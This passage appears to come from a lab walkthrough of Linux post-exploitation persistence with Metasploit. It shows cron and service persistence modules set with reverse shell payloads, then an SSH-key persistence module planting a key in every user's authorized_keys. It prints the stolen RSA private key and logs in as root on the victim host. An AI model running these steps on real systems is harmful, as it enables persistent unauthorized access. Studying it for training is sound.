   TIMING    * * * * *        no        cron timing.  Changing will require WfsDelay to be adjusted
   USERNAME  root             no        User to run cron/crontab as


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.1.0.13        yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   1   User Crontab


msf5 exploit(linux/local/cron_persistence) > set LHOST 192.58.78.2
LHOST => 192.58.78.2
msf5 exploit(linux/local/cron_persistence) > set LPORT 4422
LPORT => 4422
msf5 exploit(linux/local/cron_persistence) > exploit

[!] SESSION may not be compatible with this module.
[*] Started reverse TCP handler on 192.58.78.2:4422 
[-] Failed to open file: /etc/cron.allow: core_channel_open: Operation failed: 1
[-] Failed to open file: /etc/cron.deny: core_channel_open: Operation failed: 1
[-] Failed to open file: /etc/cron.d/cron.allow: core_channel_open: Operation failed: 1
[-] Failed to open file: /etc/cron.d/cron.deny: core_channel_open: Operation failed: 1
[*] Waiting 90sec for execution
[*] Removing our cron entry from /var/spool/cron/crontabs/root
[*] Exploit completed, but no session was created.
```

```
msf5 exploit(linux/local/cron_persistence) > use exploit/linux/local/service_persistence
msf5 exploit(linux/local/service_persistence) > info

       Name: Service Persistence
     Module: exploit/linux/local/service_persistence
   Platform: Unix, Linux
       Arch: cmd
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 1983-01-01

Provided by:
  h00die <mike@shorebreaksecurity.com>
  Cale Black

Available targets:
  Id  Name
  --  ----
  0   Auto
  1   System V
  2   Upstart
  3   systemd
  4   systemd user

Check supported:
  No

Basic options:
  Name        Current Setting  Required  Description
  ----        ---------------  --------  -----------
  SERVICE                      no        Name of service to create
  SESSION                      yes       The session to run this module on.
  SHELLPATH   /usr/local/bin   yes       Writable path to put our shell
  SHELL_NAME                   no        Name of shell file to write

Payload information:

Description:
  This module will create a service on the box, and mark it for 
  auto-restart. We need enough access to write service files and 
  potentially restart services Targets: System V: CentOS <= 5 Debian 
  <= 6 Kali 2.0 Ubuntu <= 9.04 Upstart: CentOS 6 Fedora >= 9, < 15 
  Ubuntu >= 9.10, <= 14.10 systemd: CentOS 7 Debian >= 7, <=8 Fedora 
  >= 15 Ubuntu >= 15.04 Note: System V won't restart the service if it 
  dies, only an init change (reboot etc) will restart it.
```

```
msf5 exploit(linux/local/service_persistence) > set SESSION 4
SESSION => 4
msf5 exploit(linux/local/service_persistence) > exploit

[-] Exploit failed: A payload has not been selected.
[*] Exploit completed, but no session was created.
msf5 exploit(linux/local/service_persistence) > set payload cmd/unix/
set payload cmd/unix/bind_netcat         set payload cmd/unix/reverse_python      
set payload cmd/unix/reverse_netcat      set payload cmd/unix/reverse_python_ssl  
msf5 exploit(linux/local/service_persistence) > set payload cmd/unix/reverse_python
payload => cmd/unix/reverse_python
msf5 exploit(linux/local/service_persistence) > show options

Module options (exploit/linux/local/service_persistence):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   SERVICE                      no        Name of service to create
   SESSION     4                yes       The session to run this module on.
   SHELLPATH   /usr/local/bin   yes       Writable path to put our shell
   SHELL_NAME                   no        Name of shell file to write


Payload options (cmd/unix/reverse_python):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port
   SHELL  /bin/bash        yes       The system shell to use.


Exploit target:

   Id  Name
   --  ----
   0   Auto


msf5 exploit(linux/local/service_persistence) > set LHOST 192.58.78.2
LHOST => 192.58.78.2
msf5 exploit(linux/local/service_persistence) > set LPORT 4422
LPORT => 4422
msf5 exploit(linux/local/service_persistence) > exploit

[!] SESSION may not be compatible with this module.
[*] Started reverse TCP handler on 192.58.78.2:4422 
[*] Utilizing systemd
[*] Utilizing Upstart
[-] Exploit failed: Rex::Post::Meterpreter::RequestError core_channel_open: Operation failed: 1
[*] Exploit completed, but no session was created.
```

```
msf5 exploit(linux/local/service_persistence) > set target 3
target => 3
msf5 exploit(linux/local/service_persistence) > exploit

[!] SESSION may not be compatible with this module.
[*] Started reverse TCP handler on 192.58.78.2:4422 
[*] Exploit completed, but no session was created.
msf5 exploit(linux/local/service_persistence) > set target 4
target => 4
msf5 exploit(linux/local/service_persistence) > exploit

[!] SESSION may not be compatible with this module.
[*] Started reverse TCP handler on 192.58.78.2:4422 
[*] Exploit completed, but no session was created.
```

```
msf5 exploit(linux/local/service_persistence) > use post/linux/manage/sshkey_persistence
msf5 post(linux/manage/sshkey_persistence) > show options

Module options (post/linux/manage/sshkey_persistence):

   Name             Current Setting       Required  Description
   ----             ---------------       --------  -----------
   CREATESSHFOLDER  false                 yes       If no .ssh folder is found, create it for a user
   PUBKEY                                 no        Public Key File to use. (Default: Create a new one)
   SESSION                                yes       The session to run this module on.
   SSHD_CONFIG      /etc/ssh/sshd_config  yes       sshd_config file
   USERNAME                               no        User to add SSH key to (Default: all users on box)

msf5 post(linux/manage/sshkey_persistence) > set CREATESSHFOLDER true
CREATESSHFOLDER => true
msf5 post(linux/manage/sshkey_persistence) > set SESSION 4
SESSION => 4
msf5 post(linux/manage/sshkey_persistence) > info

       Name: SSH Key Persistence
     Module: post/linux/manage/sshkey_persistence
   Platform: Linux
       Arch: 
       Rank: Excellent

Provided by:
  h00die <mike@shorebreaksecurity.com>

Compatible session types:
  Meterpreter
  Shell

Basic options:
  Name             Current Setting       Required  Description
  ----             ---------------       --------  -----------
  CREATESSHFOLDER  true                  yes       If no .ssh folder is found, create it for a user
  PUBKEY                                 no        Public Key File to use. (Default: Create a new one)
  SESSION          4                     yes       The session to run this module on.
  SSHD_CONFIG      /etc/ssh/sshd_config  yes       sshd_config file
  USERNAME                               no        User to add SSH key to (Default: all users on box)

Description:
  This module will add an SSH key to a specified user (or all), to 
  allow remote login via SSH at any time.
```

```
msf5 post(linux/manage/sshkey_persistence) > exploit

[*] Checking SSH Permissions
[*] Authorized Keys File: .ssh/authorized_keys
[*] Finding .ssh directories
[*] Creating /bin/.ssh folder
[*] Creating /dev/.ssh folder
[*] Creating /home/ftp/.ssh folder
[*] Creating /home/ftp
/.ssh folder
[*] Creating /home/jackie/.ssh folder
[*] Creating /nonexistent/.ssh folder
[*] Creating /root/.ssh folder
[*] Creating /run/sshd/.ssh folder
[*] Creating /run/systemd/netif/.ssh folder
[*] Creating /run/systemd/resolve/.ssh folder
[*] Creating /usr/games/.ssh folder
[*] Creating /usr/sbin/.ssh folder
[*] Creating /var/backups/.ssh folder
[*] Creating /var/cache/man/.ssh folder
[*] Creating /var/lib/gnats/.ssh folder
[*] Creating /var/list/.ssh folder
[*] Creating /var/mail/.ssh folder
[*] Creating /var/run/ircd/.ssh folder
[*] Creating /var/spool/lpd/.ssh folder
[*] Creating /var/spool/news/.ssh folder
[*] Creating /var/spool/uucp/.ssh folder
[*] Creating /var/www/.ssh folder
[+] Storing new private key as /root/.msf4/loot/20230324102030_Linux_persistenc_192.58.78.3_id_rsa_905412.txt
[*] Adding key to /bin/.ssh/authorized_keys
[+] Key Added
[*] Adding key to /dev/.ssh/authorized_keys
[+] Key Added
[*] Adding key to /home/ftp/.ssh/authorized_keys
[+] Key Added
[*] Adding key to /home/jackie/.ssh/authorized_keys
[+] Key Added
[*] Adding key to /nonexistent/.ssh/authorized_keys
[+] Key Added
[*] Adding key to /root/.ssh/authorized_keys
[+] Key Added
[*] Adding key to /run/sshd/.ssh/authorized_keys
[+] Key Added
[*] Adding key to /run/systemd/netif/.ssh/authorized_keys
[+] Key Added
[*] Adding key to /run/systemd/resolve/.ssh/authorized_keys
[+] Key Added
[*] Adding key to /usr/games/.ssh/authorized_keys
[+] Key Added
[*] Adding key to /usr/sbin/.ssh/authorized_keys
[+] Key Added
[*] Adding key to /var/backups/.ssh/authorized_keys
[+] Key Added
[*] Adding key to /var/cache/man/.ssh/authorized_keys
[+] Key Added
[*] Adding key to /var/lib/gnats/.ssh/authorized_keys
[+] Key Added
[*] Adding key to /var/list/.ssh/authorized_keys
[+] Key Added
[*] Adding key to /var/mail/.ssh/authorized_keys
[+] Key Added
[*] Adding key to /var/run/ircd/.ssh/authorized_keys
[+] Key Added
[*] Adding key to /var/spool/lpd/.ssh/authorized_keys
[+] Key Added
[*] Adding key to /var/spool/news/.ssh/authorized_keys
[+] Key Added
[*] Adding key to /var/spool/uucp/.ssh/authorized_keys
[+] Key Added
[*] Adding key to /var/www/.ssh/authorized_keys
[+] Key Added
[*] Post module execution completed
```

```
msf5 post(linux/manage/sshkey_persistence) > loot

Loot
====

host         service  type    name        content     info                      path
----         -------  ----    ----        -------     ----                      ----
192.58.78.3           id_rsa  ssh_id_rsa  text/plain  OpenSSH Private Key File  /root/.msf4/loot/20230324102030_Linux_persistenc_192.58.78.3_id_rsa_905412.txt
msf5 post(linux/manage/sshkey_persistence) > exit -y
```

```
root@attackdefense:~# cp /root/.msf4/loot/20230324102030_Linux_persistenc_192.58.78.3_id_rsa_905412.txt ssh_key
root@attackdefense:~# cat ssh_key 
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAurreCWW0VjrKvuLsZWK1VkUmTRkA7U5q9BFjpPHrQbV7dsij
V/HjaItyTAxhyf3L5Y0RbZD54TSCblI4pzh5CjagIAmcZY+4SxR+13V0h8zKIWWk
R/DyufgtffJd0OFaWfIbAZgecI6wLjPhcvZu4eInbB48qf/oK3Eu5GNzzgabL0Sv
fmAW0AcrjZgfQ6xyzndldfnBBDSsiUi959Np1KR3CYRU4zt/pw+v6zAxT3iF0o3I
XIbF74tM00uEFQM9+K3NbOsajuuIa0FEQcmKSQAB0ZV1j16wE/HhSLOMYAhI8PA/
qjEq5CX+Y1W9zjwxDs4KcjojcLu3AbqhVG0WgwIDAQABAoIBAQCw4Je4cRV85N3u
KUfh1bmNyZy5RSkCoNhg7yPjN6EwMfeMkgtgH+nYutZ+wO/UhUsh2xmaHs0EDVhL
piiyBaVqDkppbpEuBxB8ViK8dy71//+r2PrfhpZ1oGd/ORiy5vRN5S69uNmEpzSt
30j8PADWiQHswUuXgKfslp7jim1ExpAiBvirEOgfFgg/2n0+djdwTZsm/xer/p19
BlR7T1/0Kzi7rPZEMZP9T4IK/JFuD8jPzWMs8sGivUVJD35EnYK/p5hBjXMxFqWh
ztRwqFBhkMIqG79S2565JeKSh/6xofBqeqFHtAL8Hd7r5PzqZ3vccq43CPdcOFAU
vMcADLwJAoGBAOkmg7dtRe9Wxguvu7jv+a/j+ozny/YAuP0iiGSEYXWaHDaZguUq
zRTwSo7yhhhYYEuNzr2YAFZ3RHUnyB5+Wwob9mxxXLJfCpigyZe7IGoQiY/BmwQc
6CZeq3cabZGFzdavzQeVoSg9s0KiKT+SvlhxBknWwH8EMcPwHfrJJwd1AoGBAM0H
ttNl5JXmc46Q2KnFgz1IZfYRGG7nkGFilkwDLRcH9R6uQmkwDwIkxhzoSl/qlQvw
ibN6cRad60DVS9oxJrKuFly30gA5cDCLcR7HA2IA6SMeC3wlVQaUyAOOAShArlMC
z4P/aRVLEviMXGdn2XNen1UePDvFHWXmONw/q18XAoGAKO/FQsih9eMjhNvHNzKT
gamizWjJrBj2YiPVFOkVf6Oefou3qus39Qw32x+EIfQqfDma6jktHgF0+KkSfyAq
dfzw6JuC7iK35pKcstJ9X4Il1SLmR/OXY11N9+yg/mMjACX/9uvzzu/+cJ2uZmYq
m7bEpuRZCjQ/VKrtaKI3Ax0CgYEAkbu0+SgIxX/LjX9pcasBsPKf/rqCCnqwBnij
6h2r1B4E3izw6YGOeXCYHP4Dt4+vJ5Bu4FLcxT20dR3nT4z2O7VAEeFa9GvfUbIb
0suUnPmWvS5i7Xg/qnDghp5ONkVbY4ew5tsJ32fAcUibeai4SKfuSvs1xypBzidJ
LUxYTDsCgYB8LngQV8ABRxdbIpPZcCTA/NVygHyTy+afEHqBJNtlbFn/w1/Jg1r8
gXxDVYmZlhBKdeXl8UItxmLwmJmLua6ZLh7q33+U7COU3ioeMiGYN6K4se0rkDUL
KimPoGObu4mMjnhbPtT0QPNTW4yfht4kmXJ/3yqUVCp0cAU/FCPckQ==
-----END RSA PRIVATE KEY-----
root@attackdefense:~# ls -al ssh_key 
-rw-r--r-- 1 root root 1679 Mar 24 10:24 ssh_key

```

```
root@attackdefense:~# chmod 0400 ssh_key 
root@attackdefense:~# ls -al ssh_key 
-r-------- 1 root root 1679 Mar 24 10:24 ssh_key
root@attackdefense:~# ssh -i ssh_key root@192.58.78.3
The authenticity of host '192.58.78.3 (192.58.78.3)' can't be established.
ECDSA key fingerprint is SHA256:oqLzK4Uz72ljNbol98v3RyT8BJDLVMAZql/uLIsuonI.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.58.78.3' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 5.4.0-125-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

-bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)
root@victim-1:~# id
uid=0(root) gid=0(root) groups=0(root)
root@victim-1:~# whoami
root
root@victim-1:~# ls
flag
root@victim-1:~# exit
logout
Connection to 192.58.78.3 closed.
```

```
root@attackdefense:~# ssh -i ssh_key ftp@192.58.78.3
ftp@192.58.78.3's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 5.4.0-125-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

-bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)
ftp@victim-1:~$ id
uid=15(ftp) gid=1001(ftp) groups=1001(ftp),0(root)
ftp@victim-1:~$ whoami
ftp
```